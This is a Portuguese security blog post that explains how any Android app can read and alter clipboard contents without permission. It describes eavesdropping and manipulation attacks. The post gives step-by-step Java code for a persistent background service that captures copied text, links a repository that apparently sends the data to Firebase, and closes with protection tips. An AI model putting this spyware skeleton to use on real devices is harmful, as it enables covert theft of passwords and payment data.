---
author: ["Gaba"]
date: 2018-10-10
linktitle: Área de transferência compartilhada - Android
title: Área de transferência compartilhada - Android
tags: ["vulnerabilidade", "android"]
description: "Existe uma vulnerabilidade conhecida no sistema operacional da
              Google relacionado ao compartilhamento livre de acesso aos dados
              da área de transferência, e a existência de um gerenciador desses
              dados que não precisa de nenhuma permissão especial."
weight: 1
---

Esse post tratará de uma vulnerabilidade do popular sistema operacional para
dispositivos móveis **Android**, mais especificamente de um dos seus módulos
responsáveis por gerenciar a área de transferência.

## Qual a vulnerabilidade?

O Android é o tão querido sistema operacional desenvolvido pela **Google**.
Lançado em 2008 para ser o sistema padrão de dispositivos móveis e concorrer
com o **iOS**, foi aceita rapidamente pelas empresas fabricantes desses dispositivos
e também pelos seus usuários. Essa aceitação o fez crescer muito nos últimos anos,
atualmente em sua versão  **8(Nougat)** existem muitas facilidades e uma gama
imensa de recursos que facilitam a vida de seus usuários. Alguns deles, entretanto,
podem acabar gerando vulnerabilidades.

<center>
{{< figure src="/blog/img/posts/android-clipboard/android.png" >}}
_O simpático robozinho, logotipo do Android_
</center>

Para o total entendimento da vulnerabilidade, segue rápida explicação sobre área
de transferência:

> Área de transferência (conhecida popularmente como copiar e colar) é um recurso
utilizado por um sistema operacional para o armazenamento de pequenas quantidades
de dados para transferência entre documentos ou aplicativos.

Por ser um recurso compartilhado, todos os aplicativos do sistema devem ter acesso
a essa área, isso em si não configura uma vulnerabilidade. O problema no Android
é que o mesmo possui um _gerenciador de área de transferência_. Esse gerenciador
não precisa de permissões especiais nenhuma pra ser chamado e portanto qualquer
aplicativo pode livremente copiar e/ou modificar os dados contidos nela.

Claro que esse recurso pode ser utilizado de maneiras úteis, como por exemplo
um tradutor instantâneo, um validador de CPF/CNPJ instantâneo, entre outros.
Os danos que ele pode trazer, todavia, são perigosos demais para desconsiderá-lo
como vulnerabilidade.

## Como funciona?

Para entender o problema vamos primeiro trazer alguns pontos sobre o funcionamento
do sistema operacional. Bem superficialmente falando, o Android foi feito de uma
maneira que você nunca precisa fechar os seus aplicativos. Um usuário de Android
consegue perceber facilmente que não existe o famoso "x" para fechar as janelas.
Existem serviços do sistema que gerenciam essas aplicações, fechando e reabrindo
elas quando é preciso, e existem serviços que podem chamar funções de aplicações
mesmo se elas estiverem fechadas para serem rodadas em segundo plano.

Um desses serviços é o `ClipboardManager`, ele pode ser invocado por qualquer
aplicativo a qualquer hora, sem nenhuma permissão adicional necessária. Não,
existe uma janelinha como aquela que aparece quando se abre um aplicativo
de câmera: "_câmera-genérica_ deseja usar a câmera..." . Por algum motivo a
Google acreditou que o acesso à área de transferência não precisa de permissão.

Qualquer aplicativo pode ter acesso aos dados que são colocados na área de transferência
no momento em que eles entram lá, qualquer aplicativo pode também manipular aqueles
dados no momento em que eles são copiados, **mesmo se estiver fechado**, como
será discutido mais a frente.

<center>
{{< figure src="/blog/img/posts/android-clipboard/cpaste.jpeg" >}}
_Apesar de facilitar a vida, o famoso Control C + Control V pode ter algumas
consequências bem inconvenientes_
</center>

## Exemplos práticos

Um ataque utilizando a vulnerabilidade referenciada nesse post consiste em um
aplicativo malicioso que fica a todo momento esperando por dados que chegam
na área de transferência do seu dispositivo. Os ataques podem ser divididos em 2
tipos: **ataques de escuta** e **ataques de manipulação**.


### Ataques de escuta

Os **ataques de escuta** consistem em simplesmente copiar todos os dados que
passam pela área de transferência da _vítima_ e os enviar para um servidor o qual
o atacante tenha acesso. Esse tipo de ataque pode ser utilizado, entre outros, para:

- Roubo de credenciais;
- [Engenharia social](https://pt.wikipedia.org/wiki/Engenharia_social_(seguran%C3%A7a));

Esses ataques são consideravelmente difíceis de serem identificados visto que o
software malicioso estará sempre rodando silenciosamente em segundo plano.

<center>
{{< figure src="/blog/img/posts/android-clipboard/listener_dog.jpg" >}}
_De boas esperando por um dado pessoAU_
</center>

### Ataques de manipulação

Os **ataques de manipulação** consistem em escutar os dados que chegam à área
de transferência, processá-los e alterá-los de alguma maneira maliciosa. Ele
pode ser utilizado, entre outros, para:

- Alteração de dados bancários em pagamento de boletos;
- Alteração do comportamento de websites ou roubo de meta-informações por meio
de [Javascript Injection](https://www.codeproject.com/Articles/134024/HTML-and-JavaScript-Injection);
- Executar golpes com endereços eletrônicos falsos por meio de [Phishing](https://pt.wikipedia.org/wiki/Phishing#URLs_Falsas).

Esse ataque depende um pouco da desatenção do usuário enquanto utiliza o seu
dispositivo, visto que todos eles alteram de alguma maneira o dado que foi copiado.

<center>
{{< figure src="/blog/img/posts/android-clipboard/html_inject.png" >}}
_O ataque de manipulação pode utilizar ataques clássicos como base, por exemplo
o HTML injection_
</center>

## Implementação

Vamos para a parte divertida, essa seção será mais técnica e conduzirá na implementação
simples de um sistema com a capacidade de capturar os dados que chegam à área
de transferência.

### Passo-a-passo

Para que o software seja capaz de capturar os dados da área de transferência,
é necessário se criar um serviço que rode a nossa lógica toda vez que a mesma
for alterada. Os passos para se fazer isso são:

1. Estender a classe _android.app.Service_ para que o nosso serviço seja capaz
de executar em segundo plano;
1. Parametrizá-lo como um serviço persistente;
1. Integrar o **ClipboardManager** a ele;
1. Implementar uma função para capturar os dados;
1. Registrá-lo no _Android Manifest.xml_;
1. Iniciar o serviço ao iniciar o aplicativo.

Vamos aos exemplos:

Um aplicativo minimalista que captura os dados da área de transferência pode ser
implementada assim (passos 1, 2, 3 e 4):

```java
import android.app.Service;
import android.os.IBinder;
import android.content.ClipData;
import android.content.ClipDescription;
import android.content.ClipboardManager;

public class ClipService extends Service {

    // Atributo público que indica se o serviço está ativo ou não
    public static boolean serviceIsRunning = false;

    // Atributo responsável por gerenciar a Área de transferência e ativar
    // o método "performClipboardCheck();" toda vez que a mesma for alterada
    private ClipboardManager.OnPrimaryClipChangedListener listener = new ClipboardManager.OnPrimaryClipChangedListener() {
        public void onPrimaryClipChanged() {
            performClipboardCheck();
        }
    };

    // Ativa o gerenciador ao início do serviço, e ativa sua flag de execução
    @Override
    public void onCreate() {
        ((ClipboardManager) getSystemService(CLIPBOARD_SERVICE)).addPrimaryClipChangedListener(listener);
        serviceIsRunning = true;    
    }

    // Parametriza como um serviço persistente
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // Função que contém a lógica que será executada
    private void performClipboardCheck() {
        ClipboardManager cb = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        if (cb.hasPrimaryClip()) {
            ClipData cd = cb.getPrimaryClip();
            // Checa se o dado está em "plain text"
            if (cd.getDescription().hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN)) {
                String clipboard = cd.getItemAt(0).getText().toString();

                // O conteúdo da área de transferência está
                // na variável "clipboard", divirta-se!           
                .                
                .
                .
            }
       }
   }
}
```

Para que o serviço possa ser rodado, é necessário registrá-lo ao `AndroidManifest.xml`,
para isso basta adicionar ao escopo **application** as seguintes linhas(Passo 5):

```xml
    <service
    android:name=".ClipService"
    android:enabled="true"
    android:exported="false"/>
```

Por fim, quando o aplicativo for iniciado deve-se chamar o serviço. Isso pode
ser feito, por exemplo, no método _OnCreate_ do arquivo `MainActivity.java`:

```java
  protected void onCreate(Bundle savedInstanceState) {
      super.onCreate(savedInstanceState);

      Intent intent = new Intent(this, ClipService.class);
      startService(intent);
      .
      .
      .
  }
```

Um exemplo desenvolvido pelo Enigma que envia as informações para um banco de
dados genérico do [Google Firebase](https://firebase.google.com/docs/) pode
ser visualizado e baixado nesse [repositório](https://github.com/cynthiabaran/Flashlight).

## E como eu me protejo?

### Impedir a execução de aplicativos

Como dito antes, caso você tenha um aplicativo malicioso no seu celular que se
aproveite dessa vulnerabilidade, ele rodará ela mesmo quando fechado do gerenciador
de tarefas. Existe uma maneira, contudo, que ele é impedido pelo sistema operacional
de se reiniciar quando quiser, essa maneira consiste em ir na tela de informações
do aplicativo(geralmente em configurações->aplicativo) e apertar no botão **Forçar parada**.

Alguns fabricantes como a **Asus** possuem também aplicativos de gerenciamento de aplicações 
que têm o poder de negar essas inicializações em segundo plano.

### Atenção

Se manter atento sempre que estiver utilizando a área de tranferência,
conferir se os dados copiados são os mesmos dos que estão sendo colados
e manter-se atento à comportamento estranho ou demoras excessivas ao
executar aplicativos simples.

### Evite manter aplicativos inúteis

É preferível não apenas por questão de segurança, mas por eficiência
mesmo que você mantenha em seu celular apenas aplicativos os quais
você utiliza.

### Não utilize a área de transferência para dados sensíveis

Tente não utilizar a área de transferência quando estiver mexendo com:

* Número de cartão de crédito
* Senhas 
* Emails
* Documentos pessoais
* Outras informações que julgue sensível

Dessa maneira, mesmo tendo aplicações maliciosas no seu dispositivo os
seus dados continuarão seguros.

## Referências

Estudo acadêmico completo sobre a vulnerabilidade (em inglês) - 
[Attacks on Android Clipboard](http://www.cis.syr.edu/~wedu/Research/paper/clipboard_attack_dimva2014.pdf)
